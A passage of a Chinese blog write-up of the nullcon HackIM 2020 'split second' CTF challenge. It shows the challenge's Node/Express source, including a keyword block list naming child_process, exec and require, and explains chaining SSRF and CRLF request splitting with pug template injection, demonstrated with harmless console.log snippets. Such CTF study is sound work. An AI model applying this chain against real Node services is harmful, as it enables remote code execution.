@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言nodejs 8.12.0版本的请求拆分攻击(感觉现在叫http走私要好一点2333)，pug模板的注入导致rce 0x01 首页当我们访问http://web2.ctf.nullcon.net:8081/后会显示下面的页面。 由于上面没有什么特点，url参数，交互框等，因此我们查看源代码看看有没有什么提示。 通过源码(F12查看的)我们可以看到它在页面加载js代码完成后发送了个ajax请求：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nullcon hackim 2020 ctf的split seconde的详细分析">
+<meta property="og:url" content="http://yoursite.com/2020/03/14/nullcon-hackim-2020-ctf的split-seconde的详细分析/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言nodejs 8.12.0版本的请求拆分攻击(感觉现在叫http走私要好一点2333)，pug模板的注入导致rce 0x01 首页当我们访问http://web2.ctf.nullcon.net:8081/后会显示下面的页面。 由于上面没有什么特点，url参数，交互框等，因此我们查看源代码看看有没有什么提示。 通过源码(F12查看的)我们可以看到它在页面加载js代码完成后发送了个ajax请求：">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-15-nulllcon-hackim-split-second-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-15-nulllcon-hackim-split-second-2.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-15-nulllcon-hackim-split-second-3.PNG">
+<meta property="og:updated_time" content="2020-03-14T07:37:56.597Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="nullcon hackim 2020 ctf的split seconde的详细分析">
+<meta name="twitter:description" content="前言nodejs 8.12.0版本的请求拆分攻击(感觉现在叫http走私要好一点2333)，pug模板的注入导致rce 0x01 首页当我们访问http://web2.ctf.nullcon.net:8081/后会显示下面的页面。 由于上面没有什么特点，url参数，交互框等，因此我们查看源代码看看有没有什么提示。 通过源码(F12查看的)我们可以看到它在页面加载js代码完成后发送了个ajax请求：">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-15-nulllcon-hackim-split-second-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/14/nullcon-hackim-2020-ctf的split-seconde的详细分析/">
+
+
+
+
+
+  <title>nullcon hackim 2020 ctf的split seconde的详细分析 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/nullcon-hackim-2020-ctf的split-seconde的详细分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">nullcon hackim 2020 ctf的split seconde的详细分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T15:36:26+08:00">
+                2020-03-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/nodejs-web/" itemprop="url" rel="index">
+                    <span itemprop="name">nodejs-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  11
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>nodejs 8.12.0版本的请求拆分攻击(感觉现在叫http走私要好一点2333)，pug模板的注入导致rce</p>
+<h4 id="0x01-首页"><a href="#0x01-首页" class="headerlink" title="0x01 首页"></a>0x01 首页</h4><h6 id="当我们访问http-web2-ctf-nullcon-net-8081-后会显示下面的页面。"><a href="#当我们访问http-web2-ctf-nullcon-net-8081-后会显示下面的页面。" class="headerlink" title="当我们访问http://web2.ctf.nullcon.net:8081/后会显示下面的页面。"></a>当我们访问<code>http://web2.ctf.nullcon.net:8081/</code>后会显示下面的页面。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-15-nulllcon-hackim-split-second-1.png" alt></p>
+<h6 id="由于上面没有什么特点，url参数，交互框等，因此我们查看源代码看看有没有什么提示。"><a href="#由于上面没有什么特点，url参数，交互框等，因此我们查看源代码看看有没有什么提示。" class="headerlink" title="由于上面没有什么特点，url参数，交互框等，因此我们查看源代码看看有没有什么提示。"></a>由于上面没有什么特点，url参数，交互框等，因此我们查看源代码看看有没有什么提示。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-15-nulllcon-hackim-split-second-2.PNG" alt></p>
+<h6 id="通过源码-F12查看的-我们可以看到它在页面加载js代码完成后发送了个ajax请求："><a href="#通过源码-F12查看的-我们可以看到它在页面加载js代码完成后发送了个ajax请求：" class="headerlink" title="通过源码(F12查看的)我们可以看到它在页面加载js代码完成后发送了个ajax请求："></a>通过源码(F12查看的)我们可以看到它在页面加载js代码完成后发送了个ajax请求：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">       <span class="built_in">document</span>.getElementById(<span class="string">"search"</span>).innerHTML = xhttp.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhttp.open(<span class="string">"GET"</span>, <span class="string">"/core?q=1"</span>, <span class="literal">true</span>);</span><br><span class="line">xhttp.send();</span><br></pre></td></tr></table></figure>
+
+<h6 id="我使用get请求发送-core-q-1，但是结果跟上面的首页是一样的只有一个动图，这时你可能会想会不会是sql注入，服务器端注入等，但是经过一系列的反恐尝试之没有什么用。"><a href="#我使用get请求发送-core-q-1，但是结果跟上面的首页是一样的只有一个动图，这时你可能会想会不会是sql注入，服务器端注入等，但是经过一系列的反恐尝试之没有什么用。" class="headerlink" title="我使用get请求发送/core?q=1，但是结果跟上面的首页是一样的只有一个动图，这时你可能会想会不会是sql注入，服务器端注入等，但是经过一系列的反恐尝试之没有什么用。"></a>我使用get请求发送<code>/core?q=1</code>，但是结果跟上面的首页是一样的只有一个动图，这时你可能会想会不会是sql注入，服务器端注入等，但是经过一系列的反恐尝试之没有什么用。</h6><h6 id="但是在我们查看源代码的时候还给了个提示-lt-source-gt-通过访问-source可以获取题目源码。"><a href="#但是在我们查看源代码的时候还给了个提示-lt-source-gt-通过访问-source可以获取题目源码。" class="headerlink" title="但是在我们查看源代码的时候还给了个提示&lt;!-- /source --&gt;通过访问/source可以获取题目源码。"></a>但是在我们查看源代码的时候还给了个提示<code>&lt;!-- /source --&gt;</code>通过访问<code>/source</code>可以获取题目源码。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//node 8.12.0</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/index.html'</span>));</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/source.html'</span>));</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">'/getMeme'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'&lt;iframe src="https://giphy.com/embed/LLHkw7UnvY3Kw" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw"&gt;via GIPHY&lt;/a&gt;&lt;/p&gt;'</span>)</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">'/flag'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">if</span> (ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        <span class="keyword">var</span> authheader = req.headers[<span class="string">'adminauth'</span>];</span><br><span class="line">        <span class="keyword">var</span> pug2 = <span class="built_in">decodeURI</span>(req.headers[<span class="string">'pug'</span>]);</span><br><span class="line">        <span class="keyword">var</span> x=pug2.match(<span class="regexp">/[a-z]/g</span>);</span><br><span class="line">        <span class="keyword">if</span>(!x)&#123;</span><br><span class="line">            <span class="keyword">if</span> (authheader === <span class="string">"secretpassword"</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> html = pug.render(pug2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            res.send(<span class="string">"No characters"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.send(<span class="string">"You need to come from localhost"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/getMeme?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;Errrrr, You have been Blocked&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    ...省略...</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...省略...</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h4><h6 id="通过阅读上面的代码，我们可以看到node的版本是8-12-0，服务器端使用的框架是express，使用nodejs自带的http包发送某些请求，服务端使用pug作为渲染模板-原理加jade-。"><a href="#通过阅读上面的代码，我们可以看到node的版本是8-12-0，服务器端使用的框架是express，使用nodejs自带的http包发送某些请求，服务端使用pug作为渲染模板-原理加jade-。" class="headerlink" title="通过阅读上面的代码，我们可以看到node的版本是8.12.0，服务器端使用的框架是express，使用nodejs自带的http包发送某些请求，服务端使用pug作为渲染模板(原理加jade)。"></a>通过阅读上面的代码，我们可以看到<code>node</code>的版本是<code>8.12.0</code>，服务器端使用的框架是<code>express</code>，使用<code>nodejs</code>自带的<code>http</code>包发送某些请求，服务端使用<code>pug</code>作为渲染模板(原理加<code>jade</code>)。</h6><h5 id="在没有发现漏洞之前，先梳理一下代码的流程："><a href="#在没有发现漏洞之前，先梳理一下代码的流程：" class="headerlink" title="在没有发现漏洞之前，先梳理一下代码的流程："></a>在没有发现漏洞之前，先梳理一下代码的流程：</h5><h5 id="1"><a href="#1" class="headerlink" title="1./:"></a>1.<code>/</code>:</h5><h6 id="使用sendFile来读取index-html页面并且渲染该页面，通过前面我们知道该页面有提示的内容。"><a href="#使用sendFile来读取index-html页面并且渲染该页面，通过前面我们知道该页面有提示的内容。" class="headerlink" title="使用sendFile来读取index.html页面并且渲染该页面，通过前面我们知道该页面有提示的内容。"></a>使用<code>sendFile</code>来读取<code>index.html</code>页面并且渲染该页面，通过前面我们知道该页面有提示的内容。</h6><h5 id="2-source"><a href="#2-source" class="headerlink" title="2./source:"></a>2.<code>/source</code>:</h5><h6 id="该页面返回了服务器端的全部代码。"><a href="#该页面返回了服务器端的全部代码。" class="headerlink" title="该页面返回了服务器端的全部代码。"></a>该页面返回了服务器端的全部代码。</h6><h5 id="3-getMeme"><a href="#3-getMeme" class="headerlink" title="3./getMeme:"></a>3.<code>/getMeme</code>:</h5><h6 id="该页面没有什么用就是返回了一个iframe框架，其中是个动图。"><a href="#该页面没有什么用就是返回了一个iframe框架，其中是个动图。" class="headerlink" title="该页面没有什么用就是返回了一个iframe框架，其中是个动图。"></a>该页面没有什么用就是返回了一个<code>iframe</code>框架，其中是个动图。</h6><h5 id="4-flag"><a href="#4-flag" class="headerlink" title="4./flag:"></a>4.<code>/flag</code>:</h5><h6 id="这里验证远程地址包含127-0-0-1，adminauth-secretpassword，headers头中必须包含pug字段并且其值不能包含小写字母，最后会用pug引擎渲染pug，但是这里在渲染容易受到服务器端注入攻击https-zhuanlan-zhihu-com-p-28823933，由此我们可以断定前面需要用SSRF结合CRLF来绕过，不由联想到node的版本号，因为该版本存在request-splitting漏洞。"><a href="#这里验证远程地址包含127-0-0-1，adminauth-secretpassword，headers头中必须包含pug字段并且其值不能包含小写字母，最后会用pug引擎渲染pug，但是这里在渲染容易受到服务器端注入攻击https-zhuanlan-zhihu-com-p-28823933，由此我们可以断定前面需要用SSRF结合CRLF来绕过，不由联想到node的版本号，因为该版本存在request-splitting漏洞。" class="headerlink" title="这里验证远程地址包含127.0.0.1，adminauth===secretpassword，headers头中必须包含pug字段并且其值不能包含小写字母，最后会用pug引擎渲染pug，但是这里在渲染容易受到服务器端注入攻击https://zhuanlan.zhihu.com/p/28823933，由此我们可以断定前面需要用SSRF结合CRLF来绕过，不由联想到node的版本号，因为该版本存在request splitting漏洞。"></a>这里验证远程地址包含<code>127.0.0.1</code>，<code>adminauth===secretpassword</code>，<code>headers</code>头中必须包含<code>pug</code>字段并且其值不能包含小写字母，最后会用<code>pug</code>引擎渲染<code>pug</code>，但是这里在渲染容易受到服务器端注入攻击<a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a>，由此我们可以断定前面需要用<code>SSRF</code>结合<code>CRLF</code>来绕过，不由联想到<code>node</code>的版本号，因为该版本存在<a href="https://hackerone.com/reports/409943" target="_blank" rel="noopener">request splitting漏洞</a>。</h6><h6 id="pug模板注入示例："><a href="#pug模板注入示例：" class="headerlink" title="pug模板注入示例："></a><code>pug</code>模板注入示例：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug=<span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">pug.render(<span class="string">'#&#123;console.log("1")&#125;'</span>);</span><br><span class="line">pug.render(<span class="string">'-console.log(1)'</span>);</span><br></pre></td></tr></table></figure>
+
+<h6 id="结果如下："><a href="#结果如下：" class="headerlink" title="结果如下："></a>结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<h6 id="对于pug模板的相关知识可以参考如下链接："><a href="#对于pug模板的相关知识可以参考如下链接：" class="headerlink" title="对于pug模板的相关知识可以参考如下链接："></a>对于<code>pug</code>模板的相关知识可以参考如下链接：</h6><h6 id="https-pugjs-org-language-interpolation-html"><a href="#https-pugjs-org-language-interpolation-html" class="headerlink" title="https://pugjs.org/language/interpolation.html"></a><a href="https://pugjs.org/language/interpolation.html" target="_blank" rel="noopener">https://pugjs.org/language/interpolation.html</a></h6><h6 id="通过动态的调试我们可以看到代码的拼接过程："><a href="#通过动态的调试我们可以看到代码的拼接过程：" class="headerlink" title="通过动态的调试我们可以看到代码的拼接过程："></a>通过动态的调试我们可以看到代码的拼接过程：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> runtime = <span class="built_in">require</span>(<span class="string">'./'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = wrap;</span><br><span class="line"><span class="comment">// 利用js的Function来定义一个函数，pug是参数，后面是函数的定义</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wrap</span>(<span class="params">template, templateName</span>) </span>&#123;</span><br><span class="line">  templateName = templateName || <span class="string">'template'</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(<span class="string">'pug'</span>,</span><br><span class="line">    template + <span class="string">'\n'</span> +</span><br><span class="line">    <span class="string">'return '</span> + templateName + <span class="string">';'</span></span><br><span class="line">  )(runtime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="到"><a href="#到" class="headerlink" title="到:"></a>到:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(function anonymous(pug</span><br><span class="line">) &#123;</span><br><span class="line"></span><br><span class="line">function template(locals) &#123;var pug_html = &quot;&quot;, pug_mixins = &#123;&#125;, pug_interp;var pug_debug_filename, pug_debug_line;try &#123;;var locals_for_with = (locals || &#123;&#125;);(function (console) &#123;;pug_debug_line = 1;</span><br><span class="line">pug_html = pug_html + &quot;\u003C&quot; + (console.log(&quot;1&quot;)) + &quot;\u003E\u003C\u002F&quot; + (console.log(&quot;1&quot;)) + &quot;\u003E&quot;;&#125;.call(this,&quot;console&quot; in locals_for_with?locals_for_with.console:typeof console!==&quot;undefined&quot;?console:undefined));&#125; catch (err) &#123;pug.rethrow(err, pug_debug_filename, pug_debug_line);&#125;;return pug_html;&#125;</span><br><span class="line">return template;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h6 id="上面的这段代码中的template函数就是通过Function来构造的，代码拼接进去的部分就是-u003C后面的console-log-quot-1-quot-和-u003E前面的console-log-quot-1-quot-，拼接了两个console-log-quot-1-quot-这就是，然后在函数运行的时候就会执行console-log-quot-1-quot-。"><a href="#上面的这段代码中的template函数就是通过Function来构造的，代码拼接进去的部分就是-u003C后面的console-log-quot-1-quot-和-u003E前面的console-log-quot-1-quot-，拼接了两个console-log-quot-1-quot-这就是，然后在函数运行的时候就会执行console-log-quot-1-quot-。" class="headerlink" title="上面的这段代码中的template函数就是通过Function来构造的，代码拼接进去的部分就是\u003C后面的console.log(&quot;1&quot;)和\u003E前面的console.log(&quot;1&quot;)，拼接了两个console.log(&quot;1&quot;)这就是，然后在函数运行的时候就会执行console.log(&quot;1&quot;)。"></a>上面的这段代码中的<code>template</code>函数就是通过Function来构造的，代码拼接进去的部分就是<code>\u003C</code>后面的<code>console.log(&quot;1&quot;)</code>和<code>\u003E</code>前面的<code>console.log(&quot;1&quot;)</code>，拼接了两个<code>console.log(&quot;1&quot;)</code>这就是，然后在函数运行的时候就会执行<code>console.log(&quot;1&quot;)</code>。</h6><h6 id="我们可以看到代码拼接进去了，结合上面两段代码简化一下就是："><a href="#我们可以看到代码拼接进去了，结合上面两段代码简化一下就是：" class="headerlink" title="我们可以看到代码拼接进去了，结合上面两段代码简化一下就是："></a>我们可以看到代码拼接进去了，结合上面两段代码简化一下就是：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> t=<span class="built_in">Function</span>(<span class="string">'pug'</span>,<span class="string">'function template(locals) 